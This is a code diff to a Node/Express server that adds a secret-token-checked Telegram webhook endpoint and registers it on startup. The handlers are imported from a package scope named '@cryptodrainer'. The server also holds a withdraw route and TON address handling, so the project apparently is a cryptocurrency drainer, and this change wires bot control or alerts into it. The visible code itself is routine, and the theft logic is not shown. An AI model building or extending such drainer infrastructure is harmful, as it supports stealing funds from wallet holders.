@@ -1,4 +1,8 @@
+import { handleTelegramUpdateSafe } from "@cryptodrainer/bot/handler";
+import { registerTelegramWebhook } from "@cryptodrainer/bot/webhook";
+import type { Update } from "@cryptodrainer/bot/telegram";
 import cors from "cors";
+import crypto from "node:crypto";
 import express from "express";
 import { Address } from "@ton/core";
 import { z } from "zod";
@@ -255,6 +259,20 @@ app.post("/api/mrkt/withdraw", async (req, res) => {
   }
 });
 
+const webhookSecret =
+  process.env.TELEGRAM_WEBHOOK_SECRET ?? crypto.randomBytes(24).toString("hex");
+
+app.post("/api/telegram/webhook", async (req, res) => {
+  const header = req.header("x-telegram-bot-api-secret-token");
+  if (header !== webhookSecret) {
+    res.sendStatus(403);
+    return;
+  }
+  res.sendStatus(200);
+  const update = req.body as Update;
+  void handleTelegramUpdateSafe(update);
+});
+
 app.get("/api/health", (_req, res) => res.json({ ok: true }));
 
 app.get("*", (req, res, next) => {
@@ -266,4 +284,7 @@ app.get("*", (req, res, next) => {
 
 app.listen(config.port, () => {
   console.log(`server on :${config.port}`);
+  registerTelegramWebhook(config.serverPublicUrl, webhookSecret).catch((e: unknown) => {
+    console.error("setWebhook failed", e);
+  });
 });
